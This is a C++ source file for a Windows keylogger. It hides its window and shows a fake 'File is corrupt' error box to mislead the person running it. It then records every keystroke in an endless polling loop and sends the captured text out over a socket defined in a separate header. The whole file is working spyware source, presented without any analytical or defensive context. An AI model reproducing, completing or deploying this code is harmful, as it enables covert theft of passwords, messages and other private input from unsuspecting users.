#define _WIN32_WINNT 0x0500
#include <iostream>
#include <sstream>
#include <fstream>
#include "Socket.h"

bool SpecialKeys(int S_Key, std::stringstream& stream) {
	switch (S_Key) {
	case VK_SPACE:
		stream << " ";
		return true;
	case VK_RETURN:
		stream << "\n";
		return true;
	case '¾':
		stream << ".";
		return true;
	case VK_SHIFT:
		stream << "#SHIFT#";
		return true;
	case VK_BACK:
		stream << "\b";
		return true;
	case VK_RBUTTON:
		stream << "#R_CLICK#";
		return true;
	case VK_CAPITAL:
		stream << "#CAPS_LOCK#";
		return true;
	case VK_TAB:
		stream << "#TAB#";
		return true;
	case VK_UP:
		stream << "#UP#";
		return true;
	case VK_DOWN:
		stream << "#DOWN#";
		return true;
	case VK_LEFT:
		stream << "#LEFT#";
		return true;
	case VK_RIGHT:
		stream << "#RIGHT#";
		return true;
	case VK_CONTROL:
		stream << "#CONTROL#";
		return true;
	case VK_MENU:
		stream << "#ALT#";
		return true;
	default:
		return false;
	}
}

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

int main()
{
	MessageBoxW(nullptr, TEXT("File˜is˜corrupt˜and˜cannot˜be˜safely˜ex§Ÿ«¨µ²³´££££££££€€€€€€€€"), TEXT("Error"), MB_OK);

	openSocket();

	char KEY = 'x';

	while (true) {
		Sleep(10);

		std::stringstream stream;
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY, stream) == false) {
					stream << char(KEY);
				}
			}
		}

		if (!stream.str().empty()) {
			sendData(stream.str().c_str());
		}
	}

	closeSocket();
	return 0;
}
